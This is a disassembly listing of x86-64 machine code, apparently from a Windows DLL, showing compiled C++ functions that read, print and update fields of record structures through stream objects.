   180002c76:	e8 95 4c 01 00       	call   0x180017910
   180002c7b:	4c 8d 9c 24 90 01 00 	lea    0x190(%rsp),%r11
   180002c82:	00 
   180002c83:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180002c87:	49 8b 73 20          	mov    0x20(%r11),%rsi
   180002c8b:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   180002c8f:	49 8b e3             	mov    %r11,%rsp
   180002c92:	5d                   	pop    %rbp
   180002c93:	c3                   	ret
   180002c94:	f6 c2 04             	test   $0x4,%dl
   180002c97:	74 09                	je     0x180002ca2
   180002c99:	48 8d 1d 50 c5 04 00 	lea    0x4c550(%rip),%rbx        # 0x18004f1f0
   180002ca0:	eb 15                	jmp    0x180002cb7
   180002ca2:	f6 c2 02             	test   $0x2,%dl
   180002ca5:	48 8d 1d 5c c5 04 00 	lea    0x4c55c(%rip),%rbx        # 0x18004f208
   180002cac:	48 8d 05 6d c5 04 00 	lea    0x4c56d(%rip),%rax        # 0x18004f220
   180002cb3:	48 0f 44 d8          	cmove  %rax,%rbx
   180002cb7:	ba 01 00 00 00       	mov    $0x1,%edx
   180002cbc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002cc1:	e8 aa e8 ff ff       	call   0x180001570
   180002cc6:	4c 8b c0             	mov    %rax,%r8
   180002cc9:	48 8b d3             	mov    %rbx,%rdx
   180002ccc:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002cd1:	e8 0a f1 ff ff       	call   0x180001de0
   180002cd6:	48 8d 15 8b 2c 05 00 	lea    0x52c8b(%rip),%rdx        # 0x180055968
   180002cdd:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002ce2:	e8 e5 6a 01 00       	call   0x1800197cc
   180002ce7:	cc                   	int3
   180002ce8:	cc                   	int3
   180002ce9:	cc                   	int3
   180002cea:	cc                   	int3
   180002ceb:	cc                   	int3
   180002cec:	cc                   	int3
   180002ced:	cc                   	int3
   180002cee:	cc                   	int3
   180002cef:	cc                   	int3
   180002cf0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002cf5:	57                   	push   %rdi
   180002cf6:	48 83 ec 20          	sub    $0x20,%rsp
   180002cfa:	48 8b d9             	mov    %rcx,%rbx
   180002cfd:	48 8d b9 b0 00 00 00 	lea    0xb0(%rcx),%rdi
   180002d04:	48 8b 01             	mov    (%rcx),%rax
   180002d07:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002d0b:	48 8d 05 6e d0 04 00 	lea    0x4d06e(%rip),%rax        # 0x18004fd80
   180002d12:	48 89 84 3a 50 ff ff 	mov    %rax,-0xb0(%rdx,%rdi,1)
   180002d19:	ff 
   180002d1a:	48 8b 01             	mov    (%rcx),%rax
   180002d1d:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002d21:	44 8d 82 50 ff ff ff 	lea    -0xb0(%rdx),%r8d
   180002d28:	44 89 84 3a 4c ff ff 	mov    %r8d,-0xb4(%rdx,%rdi,1)
   180002d2f:	ff 
   180002d30:	48 8d 8f 60 ff ff ff 	lea    -0xa0(%rdi),%rcx
   180002d37:	e8 b4 7c 00 00       	call   0x18000a9f0
   180002d3c:	48 8b 03             	mov    (%rbx),%rax
   180002d3f:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002d43:	48 8d 05 76 e9 03 00 	lea    0x3e976(%rip),%rax        # 0x1800416c0
   180002d4a:	48 89 84 3a 50 ff ff 	mov    %rax,-0xb0(%rdx,%rdi,1)
   180002d51:	ff 
   180002d52:	48 8b 03             	mov    (%rbx),%rax
   180002d55:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002d59:	44 8d 42 e8          	lea    -0x18(%rdx),%r8d
   180002d5d:	44 89 84 3a 4c ff ff 	mov    %r8d,-0xb4(%rdx,%rdi,1)
   180002d64:	ff 
   180002d65:	48 8d 05 cc e7 03 00 	lea    0x3e7cc(%rip),%rax        # 0x180041538
   180002d6c:	48 89 07             	mov    %rax,(%rdi)
   180002d6f:	48 8b cf             	mov    %rdi,%rcx
   180002d72:	e8 79 40 01 00       	call   0x180016df0
   180002d77:	90                   	nop
   180002d78:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002d7d:	48 83 c4 20          	add    $0x20,%rsp
   180002d81:	5f                   	pop    %rdi
   180002d82:	c3                   	ret
   180002d83:	cc                   	int3
   180002d84:	cc                   	int3
   180002d85:	cc                   	int3
   180002d86:	cc                   	int3
   180002d87:	cc                   	int3
   180002d88:	cc                   	int3
   180002d89:	cc                   	int3
   180002d8a:	cc                   	int3
   180002d8b:	cc                   	int3
   180002d8c:	cc                   	int3
   180002d8d:	cc                   	int3
   180002d8e:	cc                   	int3
   180002d8f:	cc                   	int3
   180002d90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002d95:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180002d9a:	55                   	push   %rbp
   180002d9b:	57                   	push   %rdi
   180002d9c:	41 56                	push   %r14
   180002d9e:	48 8d ac 24 70 ff ff 	lea    -0x90(%rsp),%rbp
   180002da5:	ff 
   180002da6:	48 81 ec 90 01 00 00 	sub    $0x190,%rsp
   180002dad:	48 8b 05 a4 42 05 00 	mov    0x542a4(%rip),%rax        # 0x180057058
   180002db4:	48 33 c4             	xor    %rsp,%rax
   180002db7:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   180002dbe:	48 8b d9             	mov    %rcx,%rbx
   180002dc1:	48 8d 15 50 c5 04 00 	lea    0x4c550(%rip),%rdx        # 0x18004f318
   180002dc8:	48 8d 0d 21 59 05 00 	lea    0x55921(%rip),%rcx        # 0x1800586f0
   180002dcf:	e8 2c c5 00 00       	call   0x18000f300
   180002dd4:	48 8d 15 cd c4 04 00 	lea    0x4c4cd(%rip),%rdx        # 0x18004f2a8
   180002ddb:	48 8d 0d 0e 59 05 00 	lea    0x5590e(%rip),%rcx        # 0x1800586f0
   180002de2:	e8 19 c5 00 00       	call   0x18000f300
   180002de7:	48 8d 15 42 c5 04 00 	lea    0x4c542(%rip),%rdx        # 0x18004f330
   180002dee:	48 8d 0d fb 58 05 00 	lea    0x558fb(%rip),%rcx        # 0x1800586f0
   180002df5:	e8 06 c5 00 00       	call   0x18000f300
   180002dfa:	48 8d 15 47 c5 04 00 	lea    0x4c547(%rip),%rdx        # 0x18004f348
   180002e01:	48 8d 0d e8 58 05 00 	lea    0x558e8(%rip),%rcx        # 0x1800586f0
   180002e08:	e8 f3 c4 00 00       	call   0x18000f300
   180002e0d:	48 8d 15 1c c5 04 00 	lea    0x4c51c(%rip),%rdx        # 0x18004f330
   180002e14:	48 8d 0d d5 58 05 00 	lea    0x558d5(%rip),%rcx        # 0x1800586f0
   180002e1b:	e8 e0 c4 00 00       	call   0x18000f300
   180002e20:	48 8d 15 f1 c4 04 00 	lea    0x4c4f1(%rip),%rdx        # 0x18004f318
   180002e27:	48 8d 0d c2 58 05 00 	lea    0x558c2(%rip),%rcx        # 0x1800586f0
   180002e2e:	e8 cd c4 00 00       	call   0x18000f300
   180002e33:	48 8d 15 6e c4 04 00 	lea    0x4c46e(%rip),%rdx        # 0x18004f2a8
   180002e3a:	48 8d 0d af 58 05 00 	lea    0x558af(%rip),%rcx        # 0x1800586f0
   180002e41:	e8 ba c4 00 00       	call   0x18000f300
   180002e46:	33 d2                	xor    %edx,%edx
   180002e48:	41 b8 10 01 00 00    	mov    $0x110,%r8d
   180002e4e:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002e53:	e8 f8 70 01 00       	call   0x180019f50
   180002e58:	48 8d 15 49 c6 04 00 	lea    0x4c649(%rip),%rdx        # 0x18004f4a8
   180002e5f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002e64:	e8 57 6d 00 00       	call   0x180009bc0
   180002e69:	90                   	nop
   180002e6a:	48 8d 15 37 c8 04 00 	lea    0x4c837(%rip),%rdx        # 0x18004f6a8
   180002e71:	48 8d 0d 78 58 05 00 	lea    0x55878(%rip),%rcx        # 0x1800586f0
   180002e78:	e8 83 c4 00 00       	call   0x18000f300
   180002e7d:	48 8d 15 44 c8 04 00 	lea    0x4c844(%rip),%rdx        # 0x18004f6c8
   180002e84:	48 8d 0d 65 58 05 00 	lea    0x55865(%rip),%rcx        # 0x1800586f0
   180002e8b:	e8 70 c4 00 00       	call   0x18000f300
   180002e90:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002e95:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002e99:	f6 44 0d 80 01       	testb  $0x1,-0x80(%rbp,%rcx,1)
   180002e9e:	0f 85 ec 00 00 00    	jne    0x180002f90
   180002ea4:	0f 1f 40 00          	nopl   0x0(%rax)
   180002ea8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180002eaf:	00 
   180002eb0:	48 8b d3             	mov    %rbx,%rdx
   180002eb3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002eb8:	e8 43 82 00 00       	call   0x18000b100
   180002ebd:	48 8d 15 24 c8 04 00 	lea    0x4c824(%rip),%rdx        # 0x18004f6e8
   180002ec4:	48 8d 0d 25 58 05 00 	lea    0x55825(%rip),%rcx        # 0x1800586f0
   180002ecb:	e8 30 c4 00 00       	call   0x18000f300
   180002ed0:	48 8b c8             	mov    %rax,%rcx
   180002ed3:	8b 13                	mov    (%rbx),%edx
   180002ed5:	e8 16 89 00 00       	call   0x18000b7f0
   180002eda:	48 8b c8             	mov    %rax,%rcx
   180002edd:	48 8d 15 1c c7 04 00 	lea    0x4c71c(%rip),%rdx        # 0x18004f600
   180002ee4:	e8 17 c4 00 00       	call   0x18000f300
   180002ee9:	48 8b c8             	mov    %rax,%rcx
   180002eec:	48 8d 53 04          	lea    0x4(%rbx),%rdx
   180002ef0:	e8 0b c4 00 00       	call   0x18000f300
   180002ef5:	48 8d 15 14 c7 04 00 	lea    0x4c714(%rip),%rdx        # 0x18004f610
   180002efc:	48 8d 0d ed 57 05 00 	lea    0x557ed(%rip),%rcx        # 0x1800586f0
   180002f03:	e8 f8 c3 00 00       	call   0x18000f300
   180002f08:	48 8b c8             	mov    %rax,%rcx
   180002f0b:	48 8d 53 22          	lea    0x22(%rbx),%rdx
   180002f0f:	e8 ec c3 00 00       	call   0x18000f300
   180002f14:	48 8b c8             	mov    %rax,%rcx
   180002f17:	48 8d 15 da c7 04 00 	lea    0x4c7da(%rip),%rdx        # 0x18004f6f8
   180002f1e:	e8 dd c3 00 00       	call   0x18000f300
   180002f23:	48 8b c8             	mov    %rax,%rcx
   180002f26:	48 8d 53 54          	lea    0x54(%rbx),%rdx
   180002f2a:	e8 d1 c3 00 00       	call   0x18000f300
   180002f2f:	48 8d 15 fa c6 04 00 	lea    0x4c6fa(%rip),%rdx        # 0x18004f630
   180002f36:	48 8d 0d b3 57 05 00 	lea    0x557b3(%rip),%rcx        # 0x1800586f0
   180002f3d:	e8 be c3 00 00       	call   0x18000f300
   180002f42:	48 8b c8             	mov    %rax,%rcx
   180002f45:	8b 53 64             	mov    0x64(%rbx),%edx
   180002f48:	e8 a3 88 00 00       	call   0x18000b7f0
   180002f4d:	48 8b c8             	mov    %rax,%rcx
   180002f50:	48 8d 15 b1 c7 04 00 	lea    0x4c7b1(%rip),%rdx        # 0x18004f708
   180002f57:	e8 a4 c3 00 00       	call   0x18000f300
   180002f5c:	48 8b c8             	mov    %rax,%rcx
   180002f5f:	f3 0f 10 4b 68       	movss  0x68(%rbx),%xmm1
   180002f64:	e8 67 86 00 00       	call   0x18000b5d0
   180002f69:	48 8d 15 a8 c7 04 00 	lea    0x4c7a8(%rip),%rdx        # 0x18004f718
   180002f70:	48 8d 0d 79 57 05 00 	lea    0x55779(%rip),%rcx        # 0x1800586f0
   180002f77:	e8 84 c3 00 00       	call   0x18000f300
   180002f7c:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002f81:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002f85:	f6 44 15 80 01       	testb  $0x1,-0x80(%rbp,%rdx,1)
   180002f8a:	0f 84 20 ff ff ff    	je     0x180002eb0
   180002f90:	48 8d 15 a9 c7 04 00 	lea    0x4c7a9(%rip),%rdx        # 0x18004f740
   180002f97:	48 8d 0d 52 57 05 00 	lea    0x55752(%rip),%rcx        # 0x1800586f0
   180002f9e:	e8 5d c3 00 00       	call   0x18000f300
   180002fa3:	e8 c4 14 02 00       	call   0x18002446c
   180002fa8:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180002fac:	e8 3f a2 00 00       	call   0x18000d1f0
   180002fb1:	48 85 c0             	test   %rax,%rax
   180002fb4:	75 33                	jne    0x180002fe9
   180002fb6:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002fbb:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002fbf:	b8 06 00 00 00       	mov    $0x6,%eax
   180002fc4:	ba 02 00 00 00       	mov    $0x2,%edx
   180002fc9:	48 83 7c 0d b8 00    	cmpq   $0x0,-0x48(%rbp,%rcx,1)
   180002fcf:	0f 45 c2             	cmovne %edx,%eax
   180002fd2:	0b 44 0d 80          	or     -0x80(%rbp,%rcx,1),%eax
   180002fd6:	83 e0 17             	and    $0x17,%eax
   180002fd9:	89 44 0d 80          	mov    %eax,-0x80(%rbp,%rcx,1)
   180002fdd:	8b 54 0d 84          	mov    -0x7c(%rbp,%rcx,1),%edx
   180002fe1:	23 d0                	and    %eax,%edx
   180002fe3:	0f 85 92 00 00 00    	jne    0x18000307b
   180002fe9:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002fee:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002ff2:	48 8d 05 87 cd 04 00 	lea    0x4cd87(%rip),%rax        # 0x18004fd80
   180002ff9:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   180002ffe:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180003003:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003007:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   18000300d:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   180003011:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180003015:	e8 d6 79 00 00       	call   0x18000a9f0
   18000301a:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   18000301f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003023:	48 8d 05 96 e6 03 00 	lea    0x3e696(%rip),%rax        # 0x1800416c0
   18000302a:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   18000302f:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180003034:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003038:	8d 51 e8             	lea    -0x18(%rcx),%edx
   18000303b:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   18000303f:	48 8d 05 f2 e4 03 00 	lea    0x3e4f2(%rip),%rax        # 0x180041538
   180003046:	48 89 45 20          	mov    %rax,0x20(%rbp)
   18000304a:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   18000304e:	e8 9d 3d 01 00       	call   0x180016df0
   180003053:	90                   	nop
   180003054:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   18000305b:	48 33 cc             	xor    %rsp,%rcx
   18000305e:	e8 ad 48 01 00       	call   0x180017910
   180003063:	4c 8d 9c 24 90 01 00 	lea    0x190(%rsp),%r11
   18000306a:	00 
   18000306b:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   18000306f:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180003073:	49 8b e3             	mov    %r11,%rsp
   180003076:	41 5e                	pop    %r14
   180003078:	5f                   	pop    %rdi
   180003079:	5d                   	pop    %rbp
   18000307a:	c3                   	ret
   18000307b:	f6 c2 04             	test   $0x4,%dl
   18000307e:	74 09                	je     0x180003089
   180003080:	48 8d 1d 69 c1 04 00 	lea    0x4c169(%rip),%rbx        # 0x18004f1f0
   180003087:	eb 15                	jmp    0x18000309e
   180003089:	f6 c2 02             	test   $0x2,%dl
   18000308c:	48 8d 1d 75 c1 04 00 	lea    0x4c175(%rip),%rbx        # 0x18004f208
   180003093:	48 8d 05 86 c1 04 00 	lea    0x4c186(%rip),%rax        # 0x18004f220
   18000309a:	48 0f 44 d8          	cmove  %rax,%rbx
   18000309e:	ba 01 00 00 00       	mov    $0x1,%edx
   1800030a3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800030a8:	e8 c3 e4 ff ff       	call   0x180001570
   1800030ad:	4c 8b c0             	mov    %rax,%r8
   1800030b0:	48 8b d3             	mov    %rbx,%rdx
   1800030b3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800030b8:	e8 23 ed ff ff       	call   0x180001de0
   1800030bd:	48 8d 15 a4 28 05 00 	lea    0x528a4(%rip),%rdx        # 0x180055968
   1800030c4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800030c9:	e8 fe 66 01 00       	call   0x1800197cc
   1800030ce:	cc                   	int3
   1800030cf:	cc                   	int3
   1800030d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800030d5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800030da:	55                   	push   %rbp
   1800030db:	57                   	push   %rdi
   1800030dc:	41 56                	push   %r14
   1800030de:	48 8d ac 24 50 ff ff 	lea    -0xb0(%rsp),%rbp
   1800030e5:	ff 
   1800030e6:	48 81 ec b0 01 00 00 	sub    $0x1b0,%rsp
   1800030ed:	48 8b 05 64 3f 05 00 	mov    0x53f64(%rip),%rax        # 0x180057058
   1800030f4:	48 33 c4             	xor    %rsp,%rax
   1800030f7:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   1800030fe:	44 8b f2             	mov    %edx,%r14d
   180003101:	48 8b f9             	mov    %rcx,%rdi
   180003104:	48 8d 15 0d c2 04 00 	lea    0x4c20d(%rip),%rdx        # 0x18004f318
   18000310b:	48 8d 35 de 55 05 00 	lea    0x555de(%rip),%rsi        # 0x1800586f0
   180003112:	48 8b ce             	mov    %rsi,%rcx
   180003115:	e8 e6 c1 00 00       	call   0x18000f300
   18000311a:	48 8d 15 87 c1 04 00 	lea    0x4c187(%rip),%rdx        # 0x18004f2a8
   180003121:	48 8b ce             	mov    %rsi,%rcx
   180003124:	e8 d7 c1 00 00       	call   0x18000f300
   180003129:	48 8d 15 00 c2 04 00 	lea    0x4c200(%rip),%rdx        # 0x18004f330
   180003130:	48 8b ce             	mov    %rsi,%rcx
   180003133:	e8 c8 c1 00 00       	call   0x18000f300
   180003138:	48 8d 15 09 c2 04 00 	lea    0x4c209(%rip),%rdx        # 0x18004f348
   18000313f:	48 8b ce             	mov    %rsi,%rcx
   180003142:	e8 b9 c1 00 00       	call   0x18000f300
   180003147:	48 8d 15 e2 c1 04 00 	lea    0x4c1e2(%rip),%rdx        # 0x18004f330
   18000314e:	48 8b ce             	mov    %rsi,%rcx
   180003151:	e8 aa c1 00 00       	call   0x18000f300
   180003156:	48 8d 15 bb c1 04 00 	lea    0x4c1bb(%rip),%rdx        # 0x18004f318
   18000315d:	48 8b ce             	mov    %rsi,%rcx
   180003160:	e8 9b c1 00 00       	call   0x18000f300
   180003165:	48 8d 15 3c c1 04 00 	lea    0x4c13c(%rip),%rdx        # 0x18004f2a8
   18000316c:	48 8b ce             	mov    %rsi,%rcx
   18000316f:	e8 8c c1 00 00       	call   0x18000f300
   180003174:	33 d2                	xor    %edx,%edx
   180003176:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   18000317c:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180003180:	e8 cb 6d 01 00       	call   0x180019f50
   180003185:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180003189:	e8 52 67 00 00       	call   0x1800098e0
   18000318e:	90                   	nop
   18000318f:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   180003193:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003197:	f6 44 0d 90 01       	testb  $0x1,-0x70(%rbp,%rcx,1)
   18000319c:	75 35                	jne    0x1800031d3
   18000319e:	66 90                	xchg   %ax,%ax
   1800031a0:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1800031a5:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800031a9:	e8 72 7c 00 00       	call   0x18000ae20
   1800031ae:	8b 58 08             	mov    0x8(%rax),%ebx
   1800031b1:	03 18                	add    (%rax),%ebx
   1800031b3:	48 8b d7             	mov    %rdi,%rdx
   1800031b6:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800031ba:	e8 41 7f 00 00       	call   0x18000b100
   1800031bf:	44 39 37             	cmp    %r14d,(%rdi)
   1800031c2:	74 77                	je     0x18000323b
   1800031c4:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   1800031c8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800031cc:	f6 44 0d 90 01       	testb  $0x1,-0x70(%rbp,%rcx,1)
   1800031d1:	74 cd                	je     0x1800031a0
   1800031d3:	48 8d 15 ae c6 04 00 	lea    0x4c6ae(%rip),%rdx        # 0x18004f888
   1800031da:	48 8b ce             	mov    %rsi,%rcx
   1800031dd:	e8 1e c1 00 00       	call   0x18000f300
   1800031e2:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   1800031e6:	e8 05 a0 00 00       	call   0x18000d1f0
   1800031eb:	48 85 c0             	test   %rax,%rax
   1800031ee:	0f 85 36 01 00 00    	jne    0x18000332a
   1800031f4:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   1800031f8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800031fc:	b8 06 00 00 00       	mov    $0x6,%eax
   180003201:	ba 02 00 00 00       	mov    $0x2,%edx
   180003206:	48 83 7c 0d c8 00    	cmpq   $0x0,-0x38(%rbp,%rcx,1)
   18000320c:	0f 45 c2             	cmovne %edx,%eax
   18000320f:	0b 44 0d 90          	or     -0x70(%rbp,%rcx,1),%eax
   180003213:	83 e0 17             	and    $0x17,%eax
   180003216:	89 44 0d 90          	mov    %eax,-0x70(%rbp,%rcx,1)
   18000321a:	8b 54 0d 94          	mov    -0x6c(%rbp,%rcx,1),%edx
   18000321e:	23 d0                	and    %eax,%edx
   180003220:	0f 84 04 01 00 00    	je     0x18000332a
   180003226:	f6 c2 04             	test   $0x4,%dl
   180003229:	0f 84 2b 01 00 00    	je     0x18000335a
   18000322f:	48 8d 1d ba bf 04 00 	lea    0x4bfba(%rip),%rbx        # 0x18004f1f0
   180003236:	e9 34 01 00 00       	jmp    0x18000336f
   18000323b:	48 8d 15 de c5 04 00 	lea    0x4c5de(%rip),%rdx        # 0x18004f820
   180003242:	48 8b ce             	mov    %rsi,%rcx
   180003245:	e8 b6 c0 00 00       	call   0x18000f300
   18000324a:	48 8d 15 e7 c5 04 00 	lea    0x4c5e7(%rip),%rdx        # 0x18004f838
   180003251:	48 8b ce             	mov    %rsi,%rcx
   180003254:	e8 a7 c0 00 00       	call   0x18000f300
   180003259:	48 8d 15 a0 c3 04 00 	lea    0x4c3a0(%rip),%rdx        # 0x18004f600
   180003260:	48 8b ce             	mov    %rsi,%rcx
   180003263:	e8 98 c0 00 00       	call   0x18000f300
   180003268:	4c 8d 47 04          	lea    0x4(%rdi),%r8
   18000326c:	e8 7f 1d 01 00       	call   0x180014ff0
   180003271:	48 8d 15 c0 c2 04 00 	lea    0x4c2c0(%rip),%rdx        # 0x18004f538
   180003278:	48 8b ce             	mov    %rsi,%rcx
   18000327b:	e8 80 c0 00 00       	call   0x18000f300
   180003280:	4c 8d 47 22          	lea    0x22(%rdi),%r8
   180003284:	e8 67 1d 01 00       	call   0x180014ff0
   180003289:	48 8d 15 c0 c5 04 00 	lea    0x4c5c0(%rip),%rdx        # 0x18004f850
   180003290:	48 8b ce             	mov    %rsi,%rcx
   180003293:	e8 68 c0 00 00       	call   0x18000f300
   180003298:	4c 8d 47 54          	lea    0x54(%rdi),%r8
   18000329c:	e8 4f 1d 01 00       	call   0x180014ff0
   1800032a1:	48 8d 15 b8 c5 04 00 	lea    0x4c5b8(%rip),%rdx        # 0x18004f860
   1800032a8:	48 8b ce             	mov    %rsi,%rcx
   1800032ab:	e8 50 c0 00 00       	call   0x18000f300
   1800032b0:	8b 47 64             	mov    0x64(%rdi),%eax
   1800032b3:	89 85 a0 00 00 00    	mov    %eax,0xa0(%rbp)
   1800032b9:	48 8d 95 a0 00 00 00 	lea    0xa0(%rbp),%rdx
   1800032c0:	e8 2b c9 00 00       	call   0x18000fbf0
   1800032c5:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   1800032cb:	89 47 64             	mov    %eax,0x64(%rdi)
   1800032ce:	69 c0 84 03 00 00    	imul   $0x384,%eax,%eax
   1800032d4:	66 0f 6e c0          	movd   %eax,%xmm0
   1800032d8:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   1800032db:	f3 0f 11 47 68       	movss  %xmm0,0x68(%rdi)
   1800032e0:	48 63 c3             	movslq %ebx,%rax
   1800032e3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800032e8:	0f 57 c9             	xorps  %xmm1,%xmm1
   1800032eb:	0f 11 4c 24 38       	movups %xmm1,0x38(%rsp)
   1800032f0:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1800032f5:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   1800032fa:	66 0f 15 c9          	unpckhpd %xmm1,%xmm1
   1800032fe:	f2 0f 11 4c 24 40    	movsd  %xmm1,0x40(%rsp)
   180003304:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180003309:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   18000330d:	e8 ee 7b 00 00       	call   0x18000af00
   180003312:	48 8b d7             	mov    %rdi,%rdx
   180003315:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   180003319:	e8 32 81 00 00       	call   0x18000b450
   18000331e:	48 8d 15 43 c5 04 00 	lea    0x4c543(%rip),%rdx        # 0x18004f868
   180003325:	e9 b0 fe ff ff       	jmp    0x1800031da
   18000332a:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   18000332e:	e8 6d 00 00 00       	call   0x1800033a0
   180003333:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   18000333a:	48 33 cc             	xor    %rsp,%rcx
   18000333d:	e8 ce 45 01 00       	call   0x180017910
   180003342:	4c 8d 9c 24 b0 01 00 	lea    0x1b0(%rsp),%r11
   180003349:	00 
   18000334a:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   18000334e:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180003352:	49 8b e3             	mov    %r11,%rsp
   180003355:	41 5e                	pop    %r14
   180003357:	5f                   	pop    %rdi
   180003358:	5d                   	pop    %rbp
   180003359:	c3                   	ret
   18000335a:	f6 c2 02             	test   $0x2,%dl
   18000335d:	48 8d 1d a4 be 04 00 	lea    0x4bea4(%rip),%rbx        # 0x18004f208
   180003364:	48 8d 05 b5 be 04 00 	lea    0x4beb5(%rip),%rax        # 0x18004f220
   18000336b:	48 0f 44 d8          	cmove  %rax,%rbx
   18000336f:	ba 01 00 00 00       	mov    $0x1,%edx
   180003374:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003379:	e8 f2 e1 ff ff       	call   0x180001570
   18000337e:	4c 8b c0             	mov    %rax,%r8
   180003381:	48 8b d3             	mov    %rbx,%rdx
   180003384:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003389:	e8 52 ea ff ff       	call   0x180001de0
   18000338e:	48 8d 15 d3 25 05 00 	lea    0x525d3(%rip),%rdx        # 0x180055968
   180003395:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000339a:	e8 2d 64 01 00       	call   0x1800197cc
   18000339f:	cc                   	int3
   1800033a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800033a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800033aa:	57                   	push   %rdi
   1800033ab:	48 83 ec 20          	sub    $0x20,%rsp
   1800033af:	48 8b f9             	mov    %rcx,%rdi
   1800033b2:	48 8d b1 b8 00 00 00 	lea    0xb8(%rcx),%rsi
   1800033b9:	48 8b 01             	mov    (%rcx),%rax
   1800033bc:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1800033c0:	48 8d 05 e1 c9 04 00 	lea    0x4c9e1(%rip),%rax        # 0x18004fda8
   1800033c7:	48 89 84 32 48 ff ff 	mov    %rax,-0xb8(%rdx,%rsi,1)
   1800033ce:	ff 
   1800033cf:	48 8b 01             	mov    (%rcx),%rax
   1800033d2:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1800033d6:	44 8d 82 48 ff ff ff 	lea    -0xb8(%rdx),%r8d
   1800033dd:	44 89 84 32 44 ff ff 	mov    %r8d,-0xbc(%rdx,%rsi,1)
   1800033e4:	ff 
   1800033e5:	48 8d 8e 60 ff ff ff 	lea    -0xa0(%rsi),%rcx
   1800033ec:	e8 ff 75 00 00       	call   0x18000a9f0
   1800033f1:	48 8b 07             	mov    (%rdi),%rax
   1800033f4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800033f8:	48 8d 05 91 c9 04 00 	lea    0x4c991(%rip),%rax        # 0x18004fd90
   1800033ff:	48 89 84 31 48 ff ff 	mov    %rax,-0xb8(%rcx,%rsi,1)
   180003406:	ff 
   180003407:	48 8b 07             	mov    (%rdi),%rax
   18000340a:	48 63 48 04          	movslq 0x4(%rax),%rcx
